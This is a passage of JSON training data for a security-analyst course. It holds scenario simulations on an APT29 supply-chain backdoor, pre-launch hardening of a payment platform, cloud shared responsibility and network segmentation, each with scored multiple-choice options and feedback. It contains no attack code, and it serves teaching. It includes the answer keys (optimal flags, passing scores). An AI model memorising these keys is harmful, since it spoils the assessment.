stating 'definitely' overstates certainty. Attribution is probabilistic, not absolute. Additionally, going public immediately without investigation, customer notification, and coordination with authorities could cause more harm. Communicate what's known with appropriate confidence levels.\", 'consequence': 'Premature public statement. Attribution questioned. Customers learn from press before company notifi"}, {"id": "D", "text": "It's probably just cybercriminals who copied APT29's tools - nation-states wouldn't target us", "is_optimal": false, "feedback": "{'short': 'Dangerous underestimation', 'detailed': \"Software vendors with government/defense customers are prime targets for supply chain attacks - exactly APT29's methodology (see: SolarWinds). Dismissing the attribution because 'they wouldn't target us' ignores the attack pattern. Your product is deployed across government agencies and defense contractors - exactly APT29's target set.\", 'consequence': 'Leadership underestimates threat. Inadequate resources allocated. Government customers not p"}]}, {"id": "decision_3", "title": "Scope Determination", "situation": "Forensic analysis of BUILD-SRV-01 reveals a sophisticated implant using DLL side-loading, plus modifications to post-build scripts. The build logs show three release builds were created after the compromise: v4.2.1, v4.2.2, and v4.3.0. All were signed with your code signing certificate and distributed to customers.", "question": "What is the scope of the supply chain compromise?", "options": [{"id": "A", "text": "Only systems that received version 4.3.0 (the most recent) are affected", "is_optimal": false, "feedback": "{'short': 'Understates the scope significantly', 'detailed': 'The forensic timeline shows the build script was modified on January 5th, before v4.2.1 was released. All three builds (v4.2.1, v4.2.2, v4.3.0) were created after the script modification. Any customer who installed any of these versions received compromised software.', 'consequence': 'Only v4.3.0 customers notified. 1,847 installations of v4.2.1/v4.2.2 remain compromised and unaware.'}"}, {"id": "B", "text": "All customers who installed v4.2.1, v4.2.2, or v4.3.0 received compromised software", "is_optimal": true, "feedback": "{'short': 'Correct! All post-compromise builds are affected', 'detailed': 'The build script modification predates all three releases. Timeline: compromise Jan 2, script modification Jan 5, v4.2.1 released Jan 8, v4.2.2 released Jan 22, v4.3.0 released Feb 5. All 3,006 installations across these versions received backdoored software. This affects approximately 2,156 unique customers.', 'consequence': 'Complete scope identified. All affected customers can be notified. No compromised installations "}, {"id": "C", "text": "All customers are affected since we don't know how far back the compromise goes", "is_optimal": false, "feedback": "{'short': 'Overstates scope unnecessarily', 'detailed': 'While conservative, forensic evidence clearly shows the compromise began January 2nd. Versions released before this date (4.1.x and earlier) are not affected. Overstating scope creates unnecessary panic and diverts resources from actually affected customers.', 'consequence': 'All customers alerted including those with clean versions. Resources spread thin. Credibility questioned when older versions verified clean.'}"}, {"id": "D", "text": "Only customers actively targeted by the backdoor's activation logic are truly affected", "is_optimal": false, "feedback": "{'short': 'Misunderstands the risk', 'detailed': \"All customers received compromised software with a backdoor - they're all affected. The activation logic determines which customers have ACTIVE compromise vs. dormant backdoor. But dormant backdoors can be activated later, and all customers need to remediate. The distinction is priority, not whether they're affected.\", 'consequence': \"Non-targeted customers told they're fine. Dormant backdoors remain in thousands of customer environments.\"}"}]}, {"id": "decision_4", "title": "Backdoor Behavior Analysis", "situation": "Reverse engineering reveals the backdoor has selective activation logic: it only fully activates on systems matching certain criteria (.gov/.mil domains, defense contractor domain lists, specific IP ranges). On other systems, it remains dormant. This means most customers have an inactive backdoor, but government/defense customers likely have active compromise.", "question": "How does this selective activation change your response priorities?", "options": [{"id": "A", "text": "Focus exclusively on government and defense customers - others have dormant backdoors", "is_optimal": false, "feedback": "{'short': 'Dormant backdoors still require remediation', 'detailed': \"While government/defense are highest priority due to likely active compromise, all affected customers have backdoored software. Dormant backdoors can be activated later, the targeting logic could change, and customers deserve to know they have compromised software. Prioritize, but don't ignore non-targeted customers.\", 'consequence': 'Commercial customers not notified. Backdoors remain dormant but present. Attacker could activ"}, {"id": "B", "text": "Prioritize government/defense customers for immediate notification while preparing broader notification", "is_optimal": true, "feedback": "{'short': 'Correct! Prioritized response based on risk level', 'detailed': 'The selective activation creates tiers of urgency: Tier 1 (Critical) - government and defense customers with likely ACTIVE compromise need immediate notification to begin incident response. Tier 2 (High) - all other affected customers need notification to remediate dormant backdoors. All customers need notification; sequencing is based on risk.', 'consequence': 'Government/defense customers notified immediately with IR s"}, {"id": "C", "text": "Treat all customers equally - notify everyone simultaneously", "is_optimal": false, "feedback": "{'short': 'Fails to account for differing risk levels', 'detailed': \"While fairness seems appropriate, resource constraints mean you can't provide equal support to 2,800 customers simultaneously. Government/defense customers have active compromise requiring immediate IR support. Trying to treat everyone equally means high-risk customers don't get the urgency they need. Prioritization isn't unfair - it's necessary risk management.\", 'consequence': 'Government customer with active APT29 compromise"}, {"id": "D", "text": "Wait until you have complete analysis before any notification - partial information causes panic", "is_optimal": false, "feedback": "{'short': 'Dangerous delay for high-risk customers', 'detailed': \"Customers with active APT29 compromise are experiencing ongoing espionage RIGHT NOW. Every hour of delay is more data exfiltrated. You have enough information to enable customers to begin defensive actions. Perfect analysis shouldn't be the enemy of timely notification. Update notifications as you learn more.\", 'consequence': 'Government contractor with active compromise continues leaking classified information for additional days"}]}, {"id": "decision_5", "title": "Downstream Impact Assessment", "situation": "Your customer database shows 47 federal government agencies and 156 defense contractors among affected customers. Given APT29's targeting criteria match, these customers likely have active backdoors with ongoing espionage. Some defense contractors handle classified programs.", "question": "What is the primary concern for defense contractor customers?", "options": [{"id": "A", "text": "Financial liability from breach lawsuits", "is_optimal": false, "feedback": "{'short': 'Real but not the primary concern', 'detailed': 'Financial liability is a legitimate concern for any breach, but defense contractors face more critical issues. When APT29 targets defense contractors, the primary concern is national security - access to classified programs, defense technology, and strategic information. The stakes transcend financial liability.', 'consequence': 'Focus on liability while national security implications are underweighted in response.'}"}, {"id": "B", "text": "Potential access to classified information and national security implications", "is_optimal": true, "feedback": "{'short': 'Correct! National security is the critical concern', 'detailed': \"APT29 targeting defense contractors isn't about money - it's about accessing classified programs, defense technology, and strategic intelligence. A backdoor running with SYSTEM privileges on contractor networks could access CUI (Controlled Unclassified Information) and potentially classified data if networks aren't properly segmented. This is a national security incident.\", 'consequence': 'Notification to DoD and CISA p"}, {"id": "C", "text": "Compliance violations with DFARS and CMMC requirements", "is_optimal": false, "feedback": "{'short': 'Important but secondary', 'detailed': 'DFARS/CMMC compliance is relevant and the contractors will face scrutiny, but regulatory compliance is a secondary concern when a sophisticated nation-state actor may have accessed defense programs. The immediate priority is understanding and containing the national security damage, not regulatory compliance status.', 'consequence': 'Compliance review initiated while active compromise continues. Priorities misaligned.'}"}, {"id": "D", "text": "Reputational damage to contractor relationships", "is_optimal": false, "feedback": "{'short': 'Misses the severity entirely', 'detailed': \"When APT29 has potential access to defense programs, reputation is irrelevant compared to national security. The contractors aren't worried about your reputation - they're worried about whether their classified programs have been compromised. This is potential espionage, not a PR issue.\", 'consequence': \"PR strategy prioritized while counterintelligence agencies wonder why you're focused on reputation.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-SIM-005", "domain": 2, "type": "SIM", "title": "Attack Surface Reduction", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "VaultPay"}, "introduction": "VaultPay is six weeks from public launch of their mobile payment platform. The CEO has brought you in as Security Architect to conduct a pre-launch security assessment. The development team has been moving fast - really fast - and security has been 'on the roadmap' but never quite prioritized. Now, with $40 million in Series B funding and partnerships with major retailers pending, the board is demanding a security review before launch. Your job is to identify the attack surface, find the critical vulnerabilities, and recommend prioritized hardening measures that can be implemented before launc", "decision_points": [{"id": "decision_1", "title": "Attack Surface Mapping", "situation": "Your first task is to understand VaultPay's attack surface. The development team has provided architecture documentation, but you need to identify all the ways an attacker could potentially interact with the system.", "question": "What is the MOST important category of attack surface to prioritize in your initial assessment?", "options": [{"id": "A", "text": "Internal infrastructure - databases, Kubernetes cluster, internal services", "is_optimal": false, "feedback": "{'short': 'Important but not the highest priority initially', 'detailed': \"Internal infrastructure is important, but attackers typically need to breach the perimeter first. For a FinTech about to launch publicly, internet-facing attack surface is the most critical because it's exposed to every attacker on the internet from day one. Internal hardening matters, but external exposure is the front door.\", 'consequence': 'Internal infrastructure reviewed while internet-facing APIs have exploitable vu"}, {"id": "B", "text": "Internet-facing APIs and web applications - everything directly accessible from the internet", "is_optimal": true, "feedback": "{'short': 'Correct! External attack surface faces the most threat exposure', 'detailed': \"Internet-facing components are accessible to every attacker in the world. For a payment platform, this includes consumer APIs, merchant APIs, dashboards, and webhook endpoints. These are the front door - if they're vulnerable, attackers don't need to breach internal defenses. Prioritize external attack surface first.\", 'consequence': 'External attack surface mapped: 4 major internet-facing components identi"}, {"id": "C", "text": "Third-party integrations - Stripe, Plaid, and other external services", "is_optimal": false, "feedback": "{'short': 'Important but third parties have their own security', 'detailed': 'Third-party risk is real, but established fintech providers (Stripe, Plaid) have mature security programs. The bigger risk is usually how YOU integrate with them - API key management, webhook verification, data handling. This is part of attack surface analysis but not the top priority for initial assessment.', 'consequence': 'Third-party security reviewed - all major vendors have SOC 2. Meanwhile, first-party vulnerabi"}, {"id": "D", "text": "Mobile applications - iOS and Android apps are the primary user interface", "is_optimal": false, "feedback": "{'short': 'Mobile is part of external surface but APIs matter more', 'detailed': \"Mobile apps are important, but they're essentially clients to your APIs. A secure API protects against both mobile app attacks AND direct API attacks. An insecure API is vulnerable regardless of mobile app security. Focus on the API layer that mobile apps consume - that's where the real risk is.\", 'consequence': 'Mobile app security reviewed. APIs that mobile apps consume still have SQLi and IDOR vulnerabilities.'}"}]}, {"id": "decision_2", "title": "Critical Vulnerability Assessment", "situation": "Vulnerability scanning has identified multiple issues, including SQL injection, broken access control (IDOR), and hardcoded credentials. The development lead asks which should be fixed first, arguing that the IDOR 'only affects user data viewing, not payments.'", "question": "Which vulnerability should be the TOP priority for immediate remediation?", "options": [{"id": "A", "text": "Hardcoded credentials in GitHub - they provide keys to the kingdom", "is_optimal": false, "feedback": "{'short': 'Critical but requires repository access to exploit', 'detailed': 'Hardcoded credentials are serious and must be rotated, but exploitation requires access to the repository (50+ people internally). SQL injection and IDOR are exploitable by ANYONE on the internet with no prior access. External vulnerabilities exploitable by anonymous attackers take priority over internal credential exposure.', 'consequence': 'Credentials rotated. SQLi remains - external attacker dumps database including"}, {"id": "B", "text": "SQL Injection - it allows complete database compromise from the internet", "is_optimal": true, "feedback": "{'short': 'Correct! SQLi = full database compromise from anonymous attacker', 'detailed': 'SQL injection is trivially exploitable from the internet by anonymous attackers and leads to complete database compromise - all user data, all transactions, all credentials. This is the highest impact, highest exploitability vulnerability. While IDOR is also critical, SQLi typically enables more complete compromise more quickly.', 'consequence': 'SQLi fixed first. Database protected from external injection"}, {"id": "C", "text": "IDOR (broken access control) - user financial data exposure is the biggest regulatory risk", "is_optimal": false, "feedback": "{'short': 'Critical but SQLi is even worse', 'detailed': \"IDOR is absolutely critical - any user viewing any other user's transactions is a serious breach. However, SQLi enables not just viewing but complete database extraction, modification, and potentially command execution. Both need immediate attention, but SQLi's broader impact gives it slight priority.\", 'consequence': 'IDOR fixed. SQLi remains - attacker extracts entire database including the transactions IDOR would have exposed, plus eve"}, {"id": "D", "text": "Outdated dependencies (Log4j) - it's been in the news and auditors will flag it", "is_optimal": false, "feedback": "{'short': 'Important but requires specific conditions to exploit', 'detailed': 'Log4j is a known critical vulnerability, but exploitation requires the vulnerable component to process attacker-controlled input that gets logged. First-party SQLi and IDOR are immediately exploitable through normal API usage. Fix the vulnerabilities YOU created first, then address dependency vulnerabilities.', 'consequence': 'Dependencies updated. First-party code still has SQLi - attacker compromises database witho"}]}, {"id": "decision_3", "title": "Threat Modeling Approach", "situation": "You need to systematically identify threats to VaultPay. The CISO asks you to conduct threat modeling to ensure you're not missing anything. You have the STRIDE framework available and architecture documentation.", "question": "What is the PRIMARY purpose of threat modeling in this assessment?", "options": [{"id": "A", "text": "To document threats for compliance auditors and board presentations", "is_optimal": false, "feedback": "{'short': 'Documentation is a byproduct, not the purpose', 'detailed': \"While threat models can support compliance and executive communication, that's not their primary purpose. Threat modeling exists to systematically identify threats that might be missed by ad-hoc analysis or scanning. Documentation is valuable but secondary to the actual threat identification.\", 'consequence': 'Threat model document created for auditors. Actual threats not systematically analyzed. Gaps remain.'}"}, {"id": "B", "text": "To systematically identify threats and security gaps that scanning might miss", "is_optimal": true, "feedback": "{'short': 'Correct! Systematic identification of design-level threats', 'detailed': 'Threat modeling (like STRIDE) provides systematic analysis that identifies threats scanners miss: design flaws, business logic vulnerabilities, abuse cases, and architectural weaknesses. Scanners find implementation bugs; threat modeling finds design problems. Together they provide comprehensive coverage.', 'consequence': 'STRIDE analysis reveals threats scanners missed: authentication weaknesses, authorization "}, {"id": "C", "text": "To replace vulnerability scanning with a more thorough approach", "is_optimal": false, "feedback": "{'short': \"Threat modeling complements, doesn't replace scanning\", 'detailed': 'Threat modeling and vulnerability scanning serve different purposes. Scanning finds implementation vulnerabilities (SQLi, XSS, misconfigurations). Threat modeling finds design issues and architectural weaknesses. You need BOTH for comprehensive security assessment.', 'consequence': 'Threat modeling performed instead of scanning. Design issues found but implementation vulnerabilities (SQLi, IDOR) missed.'}"}, {"id": "D", "text": "To prioritize which vulnerabilities to fix based on threat likelihood", "is_optimal": false, "feedback": "{'short': 'Prioritization is an output, not the primary purpose', 'detailed': 'Threat modeling can inform prioritization, but its primary purpose is threat IDENTIFICATION. You need to know what threats exist before you can prioritize them. Risk assessment and prioritization happen after threat modeling identifies the threat landscape.', 'consequence': 'Focused on prioritization before completing threat identification. Some threats never identified and therefore never prioritized.'}"}]}, {"id": "decision_4", "title": "Third-Party Risk Assessment", "situation": "VaultPay integrates with multiple third-party services. The CEO asks whether these integrations introduce risk and whether you should reduce reliance on external services for security reasons.", "question": "What is the MOST significant third-party risk in VaultPay's current architecture?", "options": [{"id": "A", "text": "Stripe and Plaid - they handle the most sensitive financial data", "is_optimal": false, "feedback": "{'short': 'Major vendors have mature security programs', 'detailed': \"Stripe and Plaid are PCI-compliant, SOC 2 certified financial infrastructure providers. They're likely MORE secure than what VaultPay could build in-house. The risk isn't these vendors' security - it's HOW VaultPay integrates with them (API key management, webhook verification). Major fintech vendors are usually the lowest third-party risk.\", 'consequence': \"Time spent reviewing Stripe and Plaid's security certifications. They"}, {"id": "B", "text": "Twilio for SMS - SMS is vulnerable to SIM swapping attacks", "is_optimal": false, "feedback": "{'short': 'Real risk but not the most significant', 'detailed': \"SMS OTP vulnerabilities are real (SIM swap, SS7 attacks), but this is a known risk with known mitigations (push-based MFA, authenticator apps). It's a concern for authentication design, not a critical third-party vendor risk. The bigger third-party risk is in the software supply chain.\", 'consequence': 'SMS OTP risk documented. Recommendation to offer authenticator app option added. Supply chain vulnerabilities unaddressed.'}"}, {"id": "C", "text": "NPM packages and Docker images - unvetted code in the software supply chain", "is_optimal": true, "feedback": "{'short': 'Correct! Supply chain is the highest third-party risk', 'detailed': '47 npm packages with known vulnerabilities (including Log4j), no SBOM, unpinned versions, no scanning in CI/CD - this is significant supply chain risk. Unlike vetted fintech partners, open source dependencies vary wildly in security posture. Malicious or vulnerable packages can compromise the entire application. Supply chain security is often the overlooked third-party risk.', 'consequence': 'Supply chain risk priori"}, {"id": "D", "text": "AWS - reliance on a single cloud provider creates concentration risk", "is_optimal": false, "feedback": "{'short': 'Availability concern, not security risk', 'detailed': \"Single cloud provider is an availability and vendor lock-in consideration, not primarily a security risk. AWS has a strong security posture with shared responsibility model. The security risks in VaultPay's AWS usage are configuration issues (their responsibility), not AWS itself.\", 'consequence': 'Multi-cloud strategy discussions initiated. First-party AWS misconfigurations remain unaddressed.'}"}]}, {"id": "decision_5", "title": "Authentication Security", "situation": "Review of authentication mechanisms reveals significant weaknesses: no MFA on merchant dashboard, SMS-only OTP on consumer app, non-expiring JWT tokens, and weak password policies. The product team pushes back: 'MFA creates friction that hurts user conversion.'", "question": "What authentication improvement should be the TOP priority for a payment platform?", "options": [{"id": "A", "text": "Implement MFA on the admin portal first - highest privilege users", "is_optimal": false, "feedback": "{'short': 'Admin portal already has IP whitelist control', 'detailed': \"Admin portal has IP whitelisting as a compensating control. While MFA would be better, the merchant dashboard has NO additional controls AND provides access to financial operations. Merchants can process refunds, view settlements, and manage API keys with just a weak password. That's the higher risk.\", 'consequence': 'Admin MFA implemented. Merchant accounts still protected only by weak passwords. Merchant account compromise"}, {"id": "B", "text": "Require MFA on merchant dashboard - financial access with weak authentication is critical", "is_optimal": true, "feedback": "{'short': 'Correct! Merchant dashboard has financial access with minimal protection', 'detailed': 'Merchant dashboard allows: viewing all transaction data, processing refunds, managing API keys, and accessing settlement reports. Currently protected only by 6-character passwords with no MFA. A single compromised merchant could lead to mass fraud. For payment platforms, financial access points require strong authentication. User friction is acceptable for financial operations.', 'consequence': 'Me"}, {"id": "C", "text": "Fix JWT token expiration first - non-expiring tokens are the root cause of many issues", "is_optimal": false, "feedback": "{'short': 'Important but MFA provides more immediate protection', 'detailed': 'JWT expiration is important for limiting the window of a stolen token. However, if credentials are easily compromised (weak passwords, no MFA), attackers can simply get new tokens. MFA prevents credential compromise at the authentication point - fixing the root cause rather than limiting damage duration.', 'consequence': 'JWT expiration set to 1 hour. Attackers still compromise merchant accounts easily with weak passw"}, {"id": "D", "text": "Upgrade SMS OTP to authenticator apps - SMS is vulnerable to SIM swap", "is_optimal": false, "feedback": "{'short': 'Good improvement but consumers already have some MFA', 'detailed': 'Upgrading from SMS to authenticator is a valid improvement, but consumers already have SOME MFA (even if weak). Merchants have NO MFA at all for financial access. Adding MFA where none exists is more impactful than upgrading existing MFA. Address the zero-MFA problem first.', 'consequence': 'Consumer app upgraded to authenticator. Merchants still have no MFA. Merchant account compromise remains trivial.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-REM-001", "domain": 3, "type": "REM", "title": "Cloud Fundamentals Remediation", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "Greenfield Startup"}, "introduction": "Greenfield is a cloud-first startup building their entire infrastructure in the cloud. As a junior analyst, you're helping the team understand cloud security fundamentals. Your CTO wants to ensure everyone understands the security implications of different cloud choices.", "decision_points": [{"id": "decision_1", "title": "Service Model Understanding", "situation": "Greenfield is deploying a web application. The development team asks whether to use virtual machines (IaaS) or a managed app service (PaaS). They want to understand the security implications.", "question": "In a PaaS deployment, who is responsible for operating system patching?", "options": [{"id": "A", "text": "The customer is always responsible for all patching", "is_optimal": false, "feedback": "{'short': 'Incorrect - this describes IaaS', 'detailed': 'In PaaS, the provider manages the operating system and runtime environment. The provider handles OS patching. The customer is responsible for application code and data. This is a key benefit of PaaS - reduced operational burden.'}"}, {"id": "B", "text": "The cloud provider handles OS patching in PaaS", "is_optimal": true, "feedback": "{'short': 'Correct! Provider manages OS in PaaS', 'detailed': 'In PaaS, the provider manages everything up through the runtime: physical infrastructure, virtualization, OS, and middleware/runtime. The customer manages their application code and data. This is why PaaS reduces operational overhead - no OS patching required.'}"}, {"id": "C", "text": "Neither - patching is automatic in all cloud models", "is_optimal": false, "feedback": "{'short': 'Incorrect - depends on service model', 'detailed': \"Patching responsibility varies by service model. In IaaS, the customer patches the OS. In PaaS, the provider patches. In SaaS, the provider manages everything. It's not automatic for the customer in IaaS.\"}"}, {"id": "D", "text": "Patching is shared equally between customer and provider", "is_optimal": false, "feedback": "{'short': 'Incorrect - responsibilities are divided, not shared', 'detailed': \"Shared responsibility doesn't mean sharing each task. It means different tasks are assigned to different parties. OS patching in PaaS is solely the provider's responsibility. The customer focuses on application-level concerns.\"}"}]}, {"id": "decision_2", "title": "Shared Responsibility Application", "situation": "A data breach occurs at a company using AWS EC2 instances. Investigation reveals the instances were running unpatched operating systems. The company tries to blame AWS for the breach.", "question": "In this IaaS scenario, who is responsible for the unpatched OS vulnerability?", "options": [{"id": "A", "text": "AWS - they should have patched the instances automatically", "is_optimal": false, "feedback": "{'short': 'Incorrect - IaaS customers own OS management', 'detailed': 'In IaaS, the provider gives you a virtual machine - what you do with it is your responsibility. AWS provides the infrastructure; the customer manages the OS, applications, and data. OS patching is 100% customer responsibility in IaaS.'}"}, {"id": "B", "text": "The customer - they own OS patching responsibility in IaaS", "is_optimal": true, "feedback": "{'short': 'Correct! Customer manages OS in IaaS', 'detailed': \"In IaaS (EC2, Azure VMs), the customer is responsible for everything from the operating system up: OS patching, hardening, application security, and data protection. AWS secures the hypervisor and physical infrastructure, but guest OS management is the customer's job.\"}"}, {"id": "C", "text": "Shared - both parties should have caught this", "is_optimal": false, "feedback": "{'short': 'Incorrect - OS is clearly customer responsibility', 'detailed': \"While 'shared responsibility' is the model name, specific tasks have clear ownership. OS patching in IaaS is unambiguously the customer's responsibility. AWS has no access to patch your instances - they don't have credentials to your OS.\"}"}, {"id": "D", "text": "Neither - patching is an inherent cloud risk", "is_optimal": false, "feedback": "{'short': 'Incorrect - patching responsibilities are clearly defined', 'detailed': \"Patching responsibilities are well-defined in cloud models. It's not an inherent risk - it's a responsibility that needs to be managed. In IaaS, the customer manages OS; in PaaS, the provider manages OS. Clear ownership, not inherent risk.\"}"}]}, {"id": "decision_3", "title": "SaaS Security Boundaries", "situation": "Greenfield uses Microsoft 365 for email and collaboration. An employee's account is compromised via phishing, and confidential data is exfiltrated. The CEO asks who is responsible.", "question": "In this SaaS scenario, what is the PRIMARY customer security responsibility?", "options": [{"id": "A", "text": "Securing the Microsoft 365 servers", "is_optimal": false, "feedback": "{'short': 'Incorrect - provider manages SaaS infrastructure', 'detailed': \"In SaaS, the provider manages all infrastructure, including servers, operating systems, and the application itself. Microsoft secures the M365 infrastructure. Customers don't have access to or responsibility for the servers.\"}"}, {"id": "B", "text": "Managing user access and data protection", "is_optimal": true, "feedback": "{'short': 'Correct! SaaS customers manage access and data', 'detailed': 'In SaaS, customer responsibilities narrow to: user access management (who has accounts, MFA, conditional access), data classification and protection (what data is stored, who can access it), and configuration (security settings within the application). The phishing attack succeeded due to access control gaps - customer responsibility.'}"}, {"id": "C", "text": "Patching the Microsoft 365 application", "is_optimal": false, "feedback": "{'short': 'Incorrect - provider manages SaaS application', 'detailed': 'SaaS applications are managed entirely by the provider. Microsoft patches, updates, and maintains M365. Customers cannot access or modify the application code. Customer responsibility is limited to configuration and data.'}"}, {"id": "D", "text": "Encrypting data in Microsoft 365", "is_optimal": false, "feedback": "{'short': 'Partially relevant but not primary responsibility', 'detailed': 'Microsoft provides encryption for M365 data (at rest and in transit). Customers can configure additional protection (sensitivity labels, DLP), but the primary responsibility is access management - controlling who can access the data. The phishing attack was an access control failure.'}"}]}, {"id": "decision_4", "title": "Cloud Deployment Models", "situation": "A healthcare company is moving to the cloud but has HIPAA compliance requirements. They're evaluating public cloud vs. private cloud for storing patient health information.", "question": "Can HIPAA-regulated data be stored in public cloud like AWS or Azure?", "options": [{"id": "A", "text": "No - HIPAA requires private cloud or on-premises only", "is_optimal": false, "feedback": "{'short': 'Incorrect - public cloud can be HIPAA compliant', 'detailed': \"HIPAA doesn't prohibit public cloud. AWS, Azure, and GCP all offer HIPAA-eligible services and will sign Business Associate Agreements (BAAs). Many healthcare organizations use public cloud for PHI. The key is proper configuration and BAA, not avoiding public cloud.\"}"}, {"id": "B", "text": "Yes - with proper configuration and Business Associate Agreement", "is_optimal": true, "feedback": "{'short': 'Correct! Public cloud can be HIPAA compliant with proper controls', 'detailed': 'Major public cloud providers offer HIPAA-compliant services. Requirements: sign a BAA with the provider, use only HIPAA-eligible services, configure services according to HIPAA requirements (encryption, access control, audit logging). Public cloud can actually enhance security with provider expertise and tools.'}"}, {"id": "C", "text": "Only in government cloud regions", "is_optimal": false, "feedback": "{'short': 'Incorrect - government cloud is for federal, not HIPAA', 'detailed': 'Government cloud (GovCloud, Azure Government) is for federal government workloads with FedRAMP requirements. HIPAA compliance is available in standard commercial cloud regions. Government cloud is neither required nor particularly beneficial for HIPAA.'}"}, {"id": "D", "text": "Yes - cloud providers automatically handle all HIPAA requirements", "is_optimal": false, "feedback": "{'short': 'Incorrect - shared responsibility applies', 'detailed': \"Shared responsibility still applies. The provider offers HIPAA-eligible infrastructure, but the customer must: configure services properly, manage access appropriately, encrypt data, implement audit logging, and manage compliance documentation. It's not automatic.\"}"}]}, {"id": "decision_5", "title": "Responsibility Summary", "situation": "Your CTO asks you to create a quick reference showing security responsibilities across cloud models. You need to demonstrate your understanding.", "question": "Which statement BEST describes the shared responsibility model?", "options": [{"id": "A", "text": "Cloud providers are responsible for all security in the cloud", "is_optimal": false, "feedback": "{'short': 'Incorrect - customers have significant responsibilities', 'detailed': 'Cloud providers secure the cloud infrastructure, but customers are always responsible for their data, access management, and configuration. Many cloud breaches are due to customer misconfiguration, not provider failures. Security is shared, not delegated.'}"}, {"id": "B", "text": "Provider secures the cloud infrastructure; customer secures what they put in it", "is_optimal": true, "feedback": "{'short': 'Correct! Security OF the cloud vs. IN the cloud', 'detailed': \"This is the core concept: Provider handles 'security OF the cloud' (infrastructure, physical, hypervisor). Customer handles 'security IN the cloud' (data, access, configuration). The specific split varies by service model (more customer responsibility in IaaS, less in SaaS), but this principle always applies.\"}"}, {"id": "C", "text": "Customers can delegate all security responsibilities to cloud providers", "is_optimal": false, "feedback": "{'short': 'Incorrect - customer responsibilities cannot be delegated', 'detailed': \"Customers ALWAYS retain responsibility for their data and access management. Even in SaaS where the provider manages almost everything technical, the customer must manage user access and data protection. You can't outsource all security.\"}"}, {"id": "D", "text": "Security responsibilities are identical across IaaS, PaaS, and SaaS", "is_optimal": false, "feedback": "{'short': 'Incorrect - responsibilities shift between models', 'detailed': 'Responsibilities shift significantly: IaaS = customer manages OS, applications, data. PaaS = customer manages applications, data (provider manages OS). SaaS = customer manages data and access (provider manages everything else). Understanding this shift is key to cloud security.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-REM-002", "domain": 3, "type": "REM", "title": "Network Security Basics Remediation", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "Valley Medical Clinic"}, "introduction": "Valley Medical Clinic is a small healthcare provider with basic network infrastructure. As an IT security intern, you're learning network security fundamentals while helping assess their current setup. The IT manager is teaching you key concepts as you evaluate the network.", "decision_points": [{"id": "decision_1", "title": "Network Segmentation Benefits", "situation": "Valley Medical has a flat network - all devices can communicate with all other devices directly. The IT manager explains this is a problem. A workstation infected with ransomware recently was able to spread to the EHR server.", "question": "What is the PRIMARY security benefit of network segmentation?", "options": [{"id": "A", "text": "Faster network performance", "is_optimal": false, "feedback": "{'short': 'Performance is a benefit, but not the primary security reason', 'detailed': 'Segmentation can improve performance by reducing broadcast traffic, but this is an operational benefit. The primary SECURITY benefit is limiting lateral movement - containing breaches to prevent spread.'}"}, {"id": "B", "text": "Limits lateral movement - contains breaches to affected segment", "is_optimal": true, "feedback": "{'short': 'Correct! Segmentation contains breaches', 'detailed': 'The primary security benefit is limiting lateral movement. In the scenario, ransomware spread from a workstation to the EHR server because there were no barriers. With segmentation, the workstation segment would be separated from the server segment, requiring the malware to bypass firewall controls to spread.'}"}, {"id": "C", "text": "Makes the network easier to manage", "is_optimal": false, "feedback": "{'short': 'Actually, segmentation adds management complexity', 'detailed': 'Segmentation typically increases management complexity - more VLANs, more firewall rules, more configuration. Organizations accept this complexity because the security benefits outweigh the operational overhead.'}"}, {"id": "D", "text": "Eliminates the need for firewalls", "is_optimal": false, "feedback": "{'short': 'Incorrect - segmentation requires firewalls to be effective', 'detailed': 'VLANs provide Layer 2 separation, but without firewall rules between segments, traffic can still flow freely via routing. Segmentation and firewalls work together - segmentation creates boundaries, firewalls enforce them.'}"}]}, {"id": "decision_2", "title": "Firewall Placement", "situation": "The IT manager wants to improve network security by adding firewalls. Currently, there's only a basic router at the internet edge. The clinic has workstations, servers with patient data, and guest WiFi.", "question": "Where should firewalls be placed for defense in depth?", "options": [{"id": "A", "text": "Only at the perimeter between internet and internal network", "is_optimal": false, "feedback": "{'short': 'Perimeter-only misses internal threats', 'detailed': \"Perimeter firewall protects against external threats but doesn't help once an attacker is inside (phishing, infected device). Internal threats and lateral movement bypass perimeter controls. Defense in depth requires internal firewalls too.\"}"}, {"id": "B", "text": "Perimeter AND between internal segments (servers, workstations, guest)", "is_optimal": true, "feedback": "{'short': 'Correct! Multiple firewall layers provide defense in depth', 'detailed': 'Defense in depth requires: perimeter firewall (external threats), internal firewalls between segments (lateral movement), and host firewalls on critical servers (last line). This provides protection at multiple layers - if one fails, others still protect.'}"}, {"id": "C", "text": "Only between servers and workstations - perimeter is the router's job", "is_optimal": false, "feedback": "{'short': \"Basic router doesn't provide adequate perimeter protection\", 'detailed': \"Basic routers don't have firewall capabilities - they route traffic but don't inspect or filter it effectively. A proper perimeter firewall with stateful inspection and intrusion prevention is needed. Internal segmentation alone isn't sufficient.\"}"}, {"id": "D", "text": "Firewalls aren't needed - just use antivirus on all systems", "is_optimal": false, "feedback": "{'short': 'Antivirus and firewalls serve different purposes', 'detailed': \"Antivirus detects malware on endpoints. Firewalls control network traffic. Both are needed - they're different layers of defense. Antivirus might catch ransomware on one system, but firewalls prevent it from spreading to others.\"}"}]}, {"id": "decision_3", "title": "Secure Protocols", "situation": "A vulnerability scan reveals several systems using Telnet for remote management. The IT manager asks you about the risk and what protocol should be used instead.", "question": "Why is Telnet a security risk and what should replace it?", "options": [{"id": "A", "text": "Telnet is slow - use FTP instead for better performance", "is_optimal": false, "feedback": "{'short': 'Incorrect - FTP also transmits in cleartext', 'detailed': 'FTP has the same fundamental problem as Telnet - it transmits credentials and data in cleartext. Both are insecure. SSH is the secure replacement for remote access.'}"}, {"id": "B", "text": "Telnet sends credentials in cleartext - use SSH instead", "is_optimal": true, "feedback": "{'short': 'Correct! SSH encrypts all traffic including credentials', 'detailed': 'Telnet transmits everything in cleartext - anyone who can capture network traffic can see usernames, passwords, and all commands/output. SSH encrypts the entire session. This is a critical security improvement with no functional downside.'}"}, {"id": "C", "text": "Telnet only works on old systems - use HTTP for modern management", "is_optimal": false, "feedback": "{'short': 'HTTP is also cleartext for credentials', 'detailed': 'HTTP (without TLS) transmits in cleartext just like Telnet. For web-based management, HTTPS must be used. For command-line remote access, SSH is the secure choice.'}"}, {"id": 